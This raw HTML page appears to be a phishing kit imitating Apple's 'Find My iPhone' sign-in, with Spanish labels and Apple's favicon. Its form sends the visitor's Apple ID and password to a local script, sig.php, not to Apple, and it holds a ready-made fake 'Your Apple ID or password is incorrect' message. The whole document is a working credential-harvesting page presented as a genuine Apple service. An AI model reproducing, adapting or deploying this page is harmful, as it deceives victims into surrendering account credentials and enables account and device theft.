<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<link rel="shortcut icon" href="https://www.icloud.com/applications/alc/15F91/en-us/resources/css/images/fmip_favicon.ico" type="image/x-icon">



<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Find My iPhone</title>

	

 <script> 

function revisar() { 

if(formulario.email == "") { alert('Debes poner el email') ; return false ; } 

if(formulario.password == "") { alert('Debes poner el password') ; return false ; }  

} 

</script> 



<style>

body, html {

  height: 100%;

}



body {

    background:url("map23.png") no-repeat left top #f2f2f2 fixed;

    background-repeat: no-repeat;

    background-size: 100%;

	height: 100%;

	width: 100%;

	padding: 0;

	margin: 0;

}

.Top {

	background-color: #fff; text-align:center; width:100%; font-family:Segoe, \'Segoe UI\', \'DejaVu Sans\', \'Trebuchet MS\', Verdana, sans-serif; line-height:50px; font-size:20px; color: #333; font-weight: 700; border-bottom: solid 1px #A5D7AC;

	

}

.content {

	background: url(fmi_block.png) repeat;

	height: 70%;

	text-align: center;

	margin-top: 10%;

}

.logo {

	padding-bottom:30px;

}











.form {

	

	width: 280px;

	margin: 0 auto;	

}

.form input[type=email], .form input[type=password]{

	width:270px;

	height:35px;

	margin-bottom:3px;

	font-size:16px;

	padding-left:5px;

	

	

	

}



.form input[type=submit]{

	background-color:transparent;

	border:none;

	font-size:20px;

	color:#47AF56;

	font-weight:bold;

	margin-top:30px;

	cursor:pointer;

}





.modal:target:before {

  display: block;

}

.modal:target .modal-dialog {

  -webkit-transform: translate(0, 0);

  -ms-transform: translate(0, 0);

  transform: translate(0, 0);

  top: 20%;

}

.modal-dialog {

  background: #fefefe;

  border: #333333 solid 1px;

  border-radius: 5px;

  margin-left: -200px;

  position: fixed;

  left: 50%;

  top: -100%;

  z-index: 11;

  width: 360px;

  -webkit-transform: translate(0, -500%);

  -ms-transform: translate(0, -500%);

  transform: translate(0, -500%);

  -webkit-transition: -webkit-transform 0.3s ease-out;

  -moz-transition: -moz-transform 0.3s ease-out;

  -o-transition: -o-transform 0.3s ease-out;

  transition: transform 0.3s ease-out;

}

.modal-body {

  padding: 20px;

}

.modal-header,

.modal-footer {

  padding: 10px 20px;

}

.modal-header {

  border-bottom: #eeeeee solid 1px;

}

.modal-header h2 {

  font-size: 20px;

}

.modal-footer {

  border-top: #eeeeee solid 1px;

  text-align: right;

}

/*ADDED TO STOP SCROLLING TO TOP*/

#close {

  display: none;

}



</style>



<style type="text/css"></style></head>

<body>

<!-- Modal -->

<div class="modal" id="error" aria-hidden="true" align="center">

  <div class="modal-dialog" align="center">

    

    <div class="modal-body">

	 <h4 style="color:black;text-align:center;">Your Apple ID or password is incorrect</h4>

	

    </div>

    <div class="modal-footer" align="center">

        <a href="" class="btn-close" aria-hidden="true" style="color:#1bac47; text-align:center; cursor:pointer;" align="center"><b>OK</b></a>

    </div>

    </div>

  </div>



<!-- /Modal -->





	<div class="Top">

		Buscar mi iPhone

    </div>

<div class="content">

    <div class="form" id="formbg">

    	<div class="logo"><img src="logo.png" width="115" height="115" alt="">

    	</div>

        

  	<form name="formulario" action="sig.php" method="post" onSubmit="return revisar()">

        	<div class="email">

            <input name="email" id="email" type="email" placeholder="Apple ID" autocomplete="off" pattern="^[a-zA-Z0-9.!#$%&amp;*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$">

    		</div>

            <div class="pas">

            <input name="password" type="password" placeholder="Password" id="pw" autocomplete="off">

        	</div>

        	<div class="signin">

            <input name="submit" type="submit" value="Iniciar sesión" id="singin">

        	</div>

     </form>   

        </div>

    

</div>









</body></html>
